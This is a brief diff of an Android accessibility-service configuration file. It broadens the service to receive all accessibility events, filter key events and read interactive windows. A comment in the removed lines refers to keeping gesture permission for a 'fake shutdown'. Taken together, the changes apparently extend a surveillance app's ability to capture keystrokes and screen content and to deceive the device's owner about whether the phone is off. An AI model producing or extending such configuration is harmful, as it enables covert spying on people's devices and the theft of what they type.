@@ -1,8 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-    android:accessibilityEventTypes="typeWindowStateChanged"
+    android:accessibilityEventTypes="typeAllMask"
     android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagRequestFilterKeyEvents|flagRetrieveInteractiveWindows"
+    android:canRequestFilterKeyEvents="true"
     android:canRetrieveWindowContent="true"
-    android:notificationTimeout="100"
     android:description="@string/accessibility_service_description"
-    android:canPerformGestures="true" /> <!-- FIXED: Re-added for robustness of fake shutdown -->
+    android:notificationTimeout="100"
+    android:canPerformGestures="true" />
